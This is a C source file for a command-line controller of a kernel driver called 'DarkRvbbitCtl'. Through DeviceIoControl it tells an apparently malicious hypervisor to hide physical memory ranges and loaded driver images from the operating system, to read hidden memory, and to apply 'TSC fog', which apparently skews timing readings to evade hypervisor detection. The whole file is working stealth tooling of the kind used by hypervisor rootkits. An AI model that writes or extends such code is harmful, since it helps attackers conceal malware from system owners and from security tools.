// User-mode interface for the control-driver device.
// Requests are sent through DeviceIoControl.

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define DEV_NAME      L"\\\\.\\DarkRvbbitCtl"
#define DEV_TYPE      0xD4B7

#define IOCTL_HV_PROBE        CTL_CODE(DEV_TYPE, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_HV_HIDE_RANGE   CTL_CODE(DEV_TYPE, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_HV_UNHIDE_RANGE CTL_CODE(DEV_TYPE, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_HV_PEEK_HIDDEN  CTL_CODE(DEV_TYPE, 0x803, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_HV_SET_TSC_FOG  CTL_CODE(DEV_TYPE, 0x804, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_HV_QUERY_STATE  CTL_CODE(DEV_TYPE, 0x805, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_HV_HIDE_DRIVER  CTL_CODE(DEV_TYPE, 0x806, METHOD_BUFFERED, FILE_ANY_ACCESS)

typedef struct { unsigned long long PhysStart; unsigned long long Size; } HVCTL_RANGE;
typedef struct { unsigned long long PhysAddr; unsigned long long Value; } HVCTL_PEEK;
typedef struct {
    unsigned long HiddenCount;
    unsigned long CpuCount;
    unsigned char Launched;
    unsigned long TscFog;
    unsigned long long TscBaseOffset;
} HVCTL_STATE;
typedef struct { unsigned long long Base; unsigned long Size; } HVCTL_HIDE_DRV;

static HANDLE gDev = INVALID_HANDLE_VALUE;

static int open_dev(void) {
    gDev = CreateFileW(DEV_NAME, GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (gDev == INVALID_HANDLE_VALUE) {
        printf("[-] open: %lu (is dark_rvbbit_ctl loaded?)\n", GetLastError());
        return 0;
    }
    return 1;
}

static int ioctl_call(DWORD code, void *in, DWORD inLen, void *out, DWORD outCap, DWORD *ret) {
    DWORD bytes = 0;
    BOOL ok = DeviceIoControl(gDev, code, in, inLen, out, outCap, &bytes, NULL);
    if (ret) *ret = bytes;
    if (!ok) { printf("[-] ioctl 0x%X: %lu\n", code, GetLastError()); return 0; }
    return 1;
}

static unsigned long long phex(const char *s) {
    return _strtoui64(s, NULL, 16);
}

static void cmd_probe(void) {
    DWORD v = 0;
    if (ioctl_call(IOCTL_HV_PROBE, NULL, 0, &v, sizeof(v), NULL))
        printf("[+] hypervisor: %s\n", v ? "live" : "absent");
}

static void cmd_state(void) {
    HVCTL_STATE st = {0};
    if (!ioctl_call(IOCTL_HV_QUERY_STATE, NULL, 0, &st, sizeof(st), NULL)) return;
    printf("[+] launched      : %s\n", st.Launched ? "yes" : "no");
    printf("[+] cpus          : %lu\n", st.CpuCount);
    printf("[+] hidden ranges : %lu\n", st.HiddenCount);
    printf("[+] tsc fog       : %lu\n", st.TscFog);
    printf("[+] tsc offset    : 0x%llX\n", st.TscBaseOffset);
}

static void cmd_hide(const char *a1, const char *a2) {
    HVCTL_RANGE r = { phex(a1), phex(a2) };
    if (ioctl_call(IOCTL_HV_HIDE_RANGE, &r, sizeof(r), NULL, 0, NULL))
        printf("[+] hidden 0x%llX + 0x%llX\n", r.PhysStart, r.Size);
}

static void cmd_unhide(const char *a1, const char *a2) {
    HVCTL_RANGE r = { phex(a1), phex(a2) };
    if (ioctl_call(IOCTL_HV_UNHIDE_RANGE, &r, sizeof(r), NULL, 0, NULL))
        printf("[+] unhidden 0x%llX + 0x%llX\n", r.PhysStart, r.Size);
}

static void cmd_peek(const char *a1) {
    HVCTL_PEEK p = { phex(a1), 0 };
    if (ioctl_call(IOCTL_HV_PEEK_HIDDEN, &p, sizeof(p), &p, sizeof(p), NULL))
        printf("[+] [0x%llX] = 0x%llX\n", p.PhysAddr, p.Value);
}

static void cmd_fog(const char *a1) {
    unsigned long s = (unsigned long)strtoul(a1, NULL, 0);
    if (ioctl_call(IOCTL_HV_SET_TSC_FOG, &s, sizeof(s), NULL, 0, NULL))
        printf("[+] tsc fog = %lu\n", s);
}

static void cmd_hide_driver(const char *a1, const char *a2) {
    HVCTL_HIDE_DRV h = { phex(a1), (unsigned long)phex(a2) };
    if (ioctl_call(IOCTL_HV_HIDE_DRIVER, &h, sizeof(h), NULL, 0, NULL))
        printf("[+] driver hidden at 0x%llX + 0x%X\n", h.Base, h.Size);
}

static void usage(void) {
    printf("rvbbitctl <command>\n");
    printf("  probe                          check if hypervisor is live\n");
    printf("  state                          query hypervisor state\n");
    printf("  hide   <physHex> <sizeHex>     hide physical range from guest\n");
    printf("  unhide <physHex> <sizeHex>     restore range\n");
    printf("  peek   <physHex>               read 8 bytes at phys addr\n");
    printf("  fog    <strength>              set tsc fog (0 = off)\n");
    printf("  hide-driver <virtHex> <sizeHex>  hide a loaded driver image\n");
}

int main(int argc, char **argv) {
    if (argc < 2) { usage(); return 1; }
    if (!open_dev()) return 2;

    if (!strcmp(argv[1], "probe") && argc == 2)             cmd_probe();
    else if (!strcmp(argv[1], "state") && argc == 2)        cmd_state();
    else if (!strcmp(argv[1], "hide") && argc == 4)         cmd_hide(argv[2], argv[3]);
    else if (!strcmp(argv[1], "unhide") && argc == 4)       cmd_unhide(argv[2], argv[3]);
    else if (!strcmp(argv[1], "peek") && argc == 3)         cmd_peek(argv[2]);
    else if (!strcmp(argv[1], "fog") && argc == 3)          cmd_fog(argv[2]);
    else if (!strcmp(argv[1], "hide-driver") && argc == 4)  cmd_hide_driver(argv[2], argv[3]);
    else { usage(); CloseHandle(gDev); return 1; }

    CloseHandle(gDev);
    return 0;
}